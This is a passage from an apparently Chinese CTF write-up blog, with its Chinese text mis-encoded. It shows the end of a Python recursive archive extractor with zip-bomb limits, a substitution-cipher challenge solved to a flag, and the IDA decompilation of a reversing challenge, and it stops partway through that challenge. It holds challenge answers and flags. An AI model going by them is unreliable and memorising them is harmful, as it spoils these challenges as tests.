è§£å‹åˆ°å†…å­˜ä¼šæœ‰é£é™©ï¼Œæ”¹ä¸ºæµå¼å†™å…¥å¹¶ç»Ÿè®¡</span></span><br><span class="line">    dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    opener = {</span><br><span class="line">        <span class="string">"gz"</span>: gzip.<span class="built_in">open</span>,</span><br><span class="line">        <span class="string">"bz2"</span>: bz2.<span class="built_in">open</span>,</span><br><span class="line">        <span class="string">"xz"</span>: lzma.<span class="built_in">open</span>,</span><br><span class="line">    }[kind]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¾¹è§£è¾¹å†™ï¼Œè¾¹ç»Ÿè®¡ï¼ˆé˜²ç‚¸å¼¹ï¼šè¶…è¿‡ max_bytes å°±ä¸­æ­¢ï¼‰</span></span><br><span class="line">    written = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> opener(src, <span class="string">"rb"</span>) <span class="keyword">as</span> r, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = r.read(<span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            written += <span class="built_in">len</span>(chunk)</span><br><span class="line">            ensure_limits(stats, limits, add_bytes=<span class="built_in">len</span>(chunk))</span><br><span class="line">            w.write(chunk)</span><br><span class="line"></span><br><span class="line">    stats.files_written += <span class="number">1</span></span><br><span class="line">    stats.bytes_written += written</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_7z_with_py7zr</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> py7zr  <span class="comment"># type: ignore</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> py7zr.SevenZipFile(src, mode=<span class="string">"r"</span>) <span class="keyword">as</span> z:</span><br><span class="line">        <span class="comment"># py7zr ä¸å®¹æ˜“åœ¨ä¸è§£å‹å‰æ‹¿åˆ°æ‰€æœ‰æ–‡ä»¶å¤§å°ï¼Œå…ˆåšæ–‡ä»¶æ•°é™åˆ¶</span></span><br><span class="line">        names = z.getnames()</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(names))</span><br><span class="line">        z.extractall(path=out_dir)</span><br><span class="line">        <span class="comment"># äº‹åç»Ÿè®¡å¤§å°ï¼ˆç²—ç•¥ï¼‰</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> names:</span><br><span class="line">            p = (out_dir / n)</span><br><span class="line">            <span class="keyword">if</span> p.is_file():</span><br><span class="line">                sz = p.stat().st_size</span><br><span class="line">                ensure_limits(stats, limits, add_bytes=sz)</span><br><span class="line">                stats.files_written += <span class="number">1</span></span><br><span class="line">                stats.bytes_written += sz</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_with_command</span>(<span class="params">cmd: <span class="built_in">str</span>, src: Path, out_dir: Path</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ä½¿ç”¨å¤–éƒ¨å‘½ä»¤è§£å‹ï¼ˆ7z/unarï¼‰ã€‚å¤–éƒ¨å‘½ä»¤å¯èƒ½ä¼šåˆ›å»ºå­ç›®å½•æˆ–ç›´æ¥è¾“å‡ºã€‚</span></span><br><span class="line"><span class="string">    è¿™é‡Œä¸åšä½“ç§¯ç»Ÿè®¡ï¼ˆå·²ç»æœ‰å…¨å±€é™åˆ¶å¯æ§åˆ¶æ·±åº¦/æ–‡ä»¶æ•°ï¼Œä¸”å¤–éƒ¨å·¥å…·ä¸åŒéš¾ä»¥ç»Ÿä¸€ï¼‰ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cmd <span class="keyword">in</span> (<span class="string">"7z"</span>, <span class="string">"7za"</span>):</span><br><span class="line">        <span class="comment"># 7z x -oOUT SRC</span></span><br><span class="line">        p = subprocess.run([cmd, <span class="string">"x"</span>, <span class="string">f"-o<span class="subst">{<span class="built_in">str</span>(out_dir)}</span>"</span>, <span class="string">"-y"</span>, <span class="built_in">str</span>(src)],</span><br><span class="line">                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"<span class="subst">{cmd}</span> failed:\n<span class="subst">{p.stdout}</span>"</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">"unar"</span>:</span><br><span class="line">        <span class="comment"># unar -o OUT SRC</span></span><br><span class="line">        p = subprocess.run([cmd, <span class="string">"-o"</span>, <span class="built_in">str</span>(out_dir), <span class="built_in">str</span>(src)],</span><br><span class="line">                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"unar failed:\n<span class="subst">{p.stdout}</span>"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Unsupported external extractor: <span class="subst">{cmd}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_one</span>(<span class="params">src: Path, out_root: Path, stats: Stats, limits: Limits</span>) -&gt; Path:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    è§£å‹å•ä¸ªå‹ç¼©åŒ…åˆ°ä¸€ä¸ªç‹¬ç«‹ç›®å½•ï¼Œè¿”å›è¯¥ç›®å½•è·¯å¾„ã€‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ext = norm_ext(src)</span><br><span class="line">    out_dir = out_root / (src.name + <span class="string">".extracted"</span>)</span><br><span class="line">    out_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ext == <span class="string">".zip"</span>:</span><br><span class="line">        extract_zip(src, out_dir, stats, limits)</span><br><span class="line">    <span class="keyword">elif</span> ext <span class="keyword">in</span> (<span class="string">".tar"</span>, <span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        extract_tar(src, out_dir, stats, limits)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".gz"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"gz"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".bz2"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"bz2"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".xz"</span>:</span><br><span class="line">        extract_single_stream(src, out_dir, stats, limits, <span class="string">"xz"</span>)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".7z"</span>:</span><br><span class="line">        <span class="comment"># ä¼˜å…ˆ py7zrï¼›å¦åˆ™ç”¨ 7z</span></span><br><span class="line">        <span class="keyword">if</span> extract_7z_with_py7zr(src, out_dir, stats, limits):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cmd = which(<span class="string">"7z"</span>) <span class="keyword">or</span> which(<span class="string">"7za"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">                <span class="keyword">raise</span> ExtractError(<span class="string">"Need py7zr or system '7z/7za' to extract .7z"</span>)</span><br><span class="line">            extract_with_command(Path(cmd).name, src, out_dir)</span><br><span class="line">    <span class="keyword">elif</span> ext == <span class="string">".rar"</span>:</span><br><span class="line">        <span class="comment"># ä¼˜å…ˆ unarï¼Œå…¶æ¬¡ 7z</span></span><br><span class="line">        cmd = which(<span class="string">"unar"</span>) <span class="keyword">or</span> which(<span class="string">"7z"</span>) <span class="keyword">or</span> which(<span class="string">"7za"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">"Need system 'unar' or '7z/7za' to extract .rar"</span>)</span><br><span class="line">        extract_with_command(Path(cmd).name, src, out_dir)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Unsupported archive type: <span class="subst">{src}</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out_dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">iter_files</span>(<span class="params">root: Path</span>) -&gt; Iterable[Path]:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> root.rglob(<span class="string">"*"</span>):</span><br><span class="line">        <span class="keyword">if</span> p.is_file():</span><br><span class="line">            <span class="keyword">yield</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params"></span></span><br><span class="line"><span class="params">    input_path: Path,</span></span><br><span class="line"><span class="params">    output_dir: Path,</span></span><br><span class="line"><span class="params">    limits: Limits,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[Stats, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    è¿”å› (stats, archives_extracted_count)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    stats = Stats()</span><br><span class="line">    extracted_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># é˜Ÿåˆ—ï¼šè¦æ‰«æçš„ç›®å½•</span></span><br><span class="line">    scan_dirs = [input_path] <span class="keyword">if</span> input_path.is_dir() <span class="keyword">else</span> [input_path.parent]</span><br><span class="line">    <span class="comment"># å·²å¤„ç†å‹ç¼©åŒ…ï¼ˆæŒ‰ç»å¯¹è·¯å¾„+mtime+size åšç²—ç•¥å»é‡ï¼‰</span></span><br><span class="line">    seen: <span class="type">Set</span>[<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> scan_dirs:</span><br><span class="line">        <span class="keyword">if</span> depth &gt; limits.max_depth:</span><br><span class="line">            <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_depth: <span class="subst">{limits.max_depth}</span>"</span>)</span><br><span class="line">        cur = scan_dirs.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœ input_path æ˜¯å•ä¸ªæ–‡ä»¶ï¼Œä¹Ÿè¦æŠŠå®ƒä½œä¸ºå€™é€‰è§£å‹</span></span><br><span class="line">        candidates: Iterable[Path]</span><br><span class="line">        <span class="keyword">if</span> input_path.is_file() <span class="keyword">and</span> depth == <span class="number">0</span>:</span><br><span class="line">            candidates = [input_path]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            candidates = iter_files(cur)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> candidates:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> is_archive(f):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            st = f.stat()</span><br><span class="line">            key = (<span class="built_in">str</span>(f.resolve()), <span class="built_in">int</span>(st.st_mtime), <span class="built_in">int</span>(st.st_size))</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> seen:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            seen.add(key)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è§£å‹åˆ° output_dir ä¸‹ï¼ŒæŒ‰åŸæ–‡ä»¶ååˆ›å»ºç‹¬ç«‹ extracted ç›®å½•</span></span><br><span class="line">            out_sub = output_dir</span><br><span class="line">            out_created = extract_one(f, out_sub, stats, limits)</span><br><span class="line">            extracted_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ–°è§£å‹å‡ºæ¥çš„ç›®å½•ï¼Œç»§ç»­æ‰«æï¼ˆå®ç°åµŒå¥—ï¼‰</span></span><br><span class="line">            scan_dirs.append(out_created)</span><br><span class="line"></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> stats, extracted_count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    ap = argparse.ArgumentParser(description=<span class="string">"é€’å½’è§£å‹åµŒå¥—å‹å‹ç¼©åŒ…ï¼ˆzip/tar/gz/bz2/xzï¼Œ7z/rar å¯é€‰ï¼‰"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"input"</span>, <span class="built_in">help</span>=<span class="string">"è¾“å…¥å‹ç¼©åŒ…æ–‡ä»¶æˆ–ç›®å½•"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>, default=<span class="string">"extracted_out"</span>, <span class="built_in">help</span>=<span class="string">"è¾“å‡ºç›®å½•ï¼ˆé»˜è®¤ extracted_outï¼‰"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-depth"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">20</span>, <span class="built_in">help</span>=<span class="string">"æœ€å¤§åµŒå¥—æ·±åº¦ï¼ˆé»˜è®¤ 20ï¼‰"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-files"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">20000</span>, <span class="built_in">help</span>=<span class="string">"æœ€å¤šå†™å‡ºæ–‡ä»¶æ•°ï¼ˆé»˜è®¤ 20000ï¼‰"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--max-bytes"</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2_000_000_000</span>, <span class="built_in">help</span>=<span class="string">"æœ€å¤šå†™å‡ºæ€»å­—èŠ‚æ•°ï¼ˆé»˜è®¤ 2GBï¼‰"</span>)</span><br><span class="line">    ap.add_argument(<span class="string">"--overwrite"</span>, action=<span class="string">"store_true"</span>, <span class="built_in">help</span>=<span class="string">"è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶"</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line"></span><br><span class="line">    input_path = Path(args.<span class="built_in">input</span>).expanduser().resolve()</span><br><span class="line">    output_dir = Path(args.output).expanduser().resolve()</span><br><span class="line">    output_dir.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    limits = Limits(</span><br><span class="line">        max_depth=args.max_depth,</span><br><span class="line">        max_files=args.max_files,</span><br><span class="line">        max_bytes=args.max_bytes,</span><br><span class="line">        overwrite=args.overwrite,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        stats, n = recursive_extract(input_path, output_dir, limits)</span><br><span class="line">    <span class="keyword">except</span> ExtractError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] Error: <span class="subst">{e}</span>"</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Done. Archives extracted: <span class="subst">{n}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Files written: <span class="subst">{stats.files_written}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Bytes written: <span class="subst">{stats.bytes_written}</span>"</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"[+] Output dir: <span class="subst">{output_dir}</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>é™„å¸¦ç”¨æ³•ï¼š</p>
<p>è§£å‹ä¸€ä¸ªæ–‡ä»¶å¹¶é€’å½’ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py sample.zip -o out</span><br></pre></td></tr></tbody></table></figure>
<p>è§£å‹ä¸€ä¸ªç›®å½•ï¼ˆç›®å½•é‡Œå¯èƒ½æœ‰å¾ˆå¤šå‹ç¼©åŒ…/åµŒå¥—ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py ./downloads -o out</span><br></pre></td></tr></tbody></table></figure>
<p>åŠ é™åˆ¶ï¼ˆé˜²å‹ç¼©ç‚¸å¼¹ï¼‰ï¼š</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 recursive_extract.py nested.tar.gz -o out --max-depth 10 --max-files 5000 --max</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>ã€æ‰©å±•ã€‘å‹ç¼©ç‚¸å¼¹ï¼šä½“ç§¯å¾ˆå°çš„å‹ç¼©æ–‡ä»¶ï¼Œè§£å‹åä¼šå˜æˆæå…¶å·¨å¤§çš„æ•°æ®ï¼Œç”¨æ¥æ‹–å®ä½ çš„ CPUã€å†…å­˜æˆ–ç£ç›˜ã€‚<br>å®ƒæœ¬è´¨æ˜¯ ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ‰‹æ®µï¼Œåœ¨ CTFã€æ¶æ„æ ·æœ¬ã€é‚®ä»¶é™„ä»¶ã€è‡ªåŠ¨è§£å‹ç³»ç»Ÿé‡Œéƒ½éå¸¸å¸¸è§ã€‚</p>
</blockquote>
<hr>
<h2 id="â­ï¸-06-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-æœªå®Œçš„æ•…äº‹"><a href="#â­ï¸-06-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-æœªå®Œçš„æ•…äº‹" class="headerlink" title="â­ï¸ 06 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]æœªå®Œçš„æ•…äº‹"></a>â­ï¸ 06 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]æœªå®Œçš„æ•…äº‹</h2><p>ğŸš©flagï¼š<code>NSSCTF{H0nest_fr1eNd1y_4nd_C0nfidenT}</code></p>
<p>ğŸ’¡hintï¼š<code>misc</code> <code>è¯é¢‘ç»Ÿè®¡</code> <code>å¤å…¸å¯†ç </code></p>
<p>ğŸ”§toolï¼š<code>quipquip</code> <code>cyberchef</code></p>
<p>çœ‹é¢˜å¾—çŸ¥æ˜æ˜¾å•è¡¨æ›¿æ¢å¯†ç <br>å•è¡¨æ›¿æ¢å¯†ç å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://quipqiup.com/">https://quipqiup.com/</a></p>
<figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Etn Ghar lvri ur etn beefisela us sha islaas gelral. Shala'i u islurma lvta or hoi isela: ha rajal poroihai klosorm ury beef. Us ubevs ske-sholni ep sha kuy shlevmh augh beef, shala kott ba u natogusa beefzulf. Er sha bugf, os oi hurnklossar: "Sha lais, dtauia klosa os yevliatp." Us polis, daedta kala jaly vruggvisezan se os. Ieza guza bugf urmloty kosh "Era Hvrnlan Yauli ep Ietosvna" or hurn urn uifan, "O kui qvis launorm ubevs Lazanoei' uigarioer se haujar, khy non os arn?" Etn Ghar qvis izotan urn iuon, "Ne yev shorf iha svlran orse u bvssalpty el baguza luor?" Tusal, daedta mlunvutty patt or teja kosh shoi forn ep launorm. Sha gedy ep "Sha Iaumvtt Laisuvlurs" kui taps edar us sha duma khala sha ekral kui nagonorm khashal se slujat pul ukuy, urn sha dumai kala pottan kosh launali' klossar pettek-vdi - ieza ivmmaisan iha me se Ogaturn, khota eshali vlman hal se isuy. Sha shogfais era oi "Sha Soza Slujatal'i Kopa", khogh hui baar laklossar kosh iajar noppalars arnormi. Ieza zas or sha bturf dumai, khota eshali iuon meenbya or sha zulmori. Era nuy, u molt ihekan vd kosh u zurviglods klossar by Tue Ghar hoziatp. Sha isely iseddan us sha zeis awgosorm svlrorm deors, urn sha lais ep sha dumai kala bturf. "Shoi oi yevl ptum" sha molt iuon. "RIIGSP{INBvCWR0W2CyZKJECNP5WcLvCP9NZM5zuKLtbtX=}" Etn Ghar teefan evs ep sha kornek us sha puttorm duvtekrou taujai urn iuon iepsty, "O'ja baar kuosorm pel iezaera se klosa sha arnorm pel za." Sha molt kui iotars pel u zezars, shar seef evs u dar plez hal bum urn klesa er sha tuis duma: "Tusal, sha beefisela ekral kuosan pel hoi launal. Semashal, shay poroihan utt sha vrporoihan iseloai." Sha iassorm ivr ihera shlevmh sha ihed kornek, islasghorm sha ihuneki ep sha ske daedta jaly term, qvis tofa u dalpagsty dtugan pvtt ised.</span><br></pre></td></tr></tbody></table></figure>
<p>ç ´è§£åï¼š</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Old Chen runs an old bookstore at the street corner. There's a strange rule in his store: he never finishes writing any book. At about two-thirds of the way through each book, there will be a delicate bookmark. On the back, it is handwritten: "The rest, please write it yourself." At first, people were very unaccustomed to it. Some came back angrily with "One Hundred Years of Solitude" in hand and asked, "I was just reading about Remedios' ascension to heaven, why did it end?" Old Chen just smiled and said, "Do you think she turned into a butterfly or became rain?" Later, people gradually fell in love with this kind of reading. The copy of "The Seagull Restaurant" was left open at the page where the owner was deciding whether to travel far away, and the pages were filled with readers' written follow-ups - some suggested she go to Iceland, while others urged her to stay. The thickest one is "The Time Traveler's Wife", which has been rewritten with seven different endings. Some met in the blank pages, while others said goodbye in the margins. One day, a girl showed up with a manuscript written by Lao Chen himself. The story stopped at the most exciting turning point, and the rest of the pages were blank. "This is your flag" the girl said. "NSSCTF{SDBuZXN0X2ZyMWVOZDF5XzRuZF9DMG5maWRlblQ=}" Old Chen looked out of the window at the falling paulownia leaves and said softly, "I've been waiting for someone to write the ending for me." The girl was silent for a moment, then took out a pen from her bag and wrote on the last page: "Later, the bookstore owner waited for his reader. Together, they finished all the unfinished stories." The setting sun shone through the shop window, stretching the shadows of the two people very long, just like a perfectly placed full stop.</span><br></pre></td></tr></tbody></table></figure>
<p>flagå¯èƒ½æ˜¯base64ç¼–ç ï¼Œæ”¾åˆ°cyberchefé‡Œé¢çœ‹çœ‹ã€‚<br><a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a><br>å¾—åˆ°ï¼šH0nest_fr1eNd1y_4nd_C0nfidenT<br>æ‰€ä»¥flagï¼š<br>NSSCTF{H0nest_fr1eNd1y_4nd_C0nfidenT}</p>
<hr>
<h2 id="â­ï¸-07-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-debuggggg"><a href="#â­ï¸-07-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-debuggggg" class="headerlink" title="â­ï¸ 07 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]debuggggg"></a>â­ï¸ 07 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]debuggggg</h2><p>ğŸš©flagï¼š<code>NSSCTF{random_number_0r_not_abc}</code></p>
<p>ğŸ’¡hintï¼š<code>reverse</code></p>
<p>ğŸ”§toolï¼š<code>idapro</code></p>
<p>idaproæ‰¾åˆ°å…³é”®ä»£ç æ®µï¼š</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_1317</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-D8h]</span></span><br><span class="line">  _DWORD v4[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+90h] [rbp-50h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+98h] [rbp-48h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+A0h] [rbp-40h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+A8h] [rbp-38h]</span></span><br><span class="line">  _QWORD v9[<span class="number">5</span>]; <span class="comment">// [rsp+B0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"input flag:"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  *(_QWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(s) == <span class="number">32</span> )</span><br><span class="line">  {</span><br><span class="line">    qmemcpy(v9, <span class="string">"XLVGSD{mfbuha_sstgpr_9d_acc_wbi}"</span>, <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      v4[i] = rand() % <span class="number">255</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[i] &lt;= <span class="number">96</span> || s[i] &gt; <span class="number">122</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( s[i] &lt;= <span class="number">64</span> || s[i] &gt; <span class="number">90</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( s[i] &gt; <span class="number">47</span> &amp;&amp; s[i] &lt;= <span class="number">57</span> )</span><br><span class="line">            s[i] = (s[i] - <span class="number">48</span> + v4[i] % <span class="number">10</span>) % <span class="number">10</span> + <span class="number">48</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          s[i] = (s[i] - <span class="number">65</span> - v4[i] % <span class="number">26</span> + <span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        s[i] = (s[i] - <span class="number">97</span> + v4[i] % <span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    sub_126B(s, v9);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"wrong length"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v10 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>å…³é”®ä»£ç æ®µ2:</p>
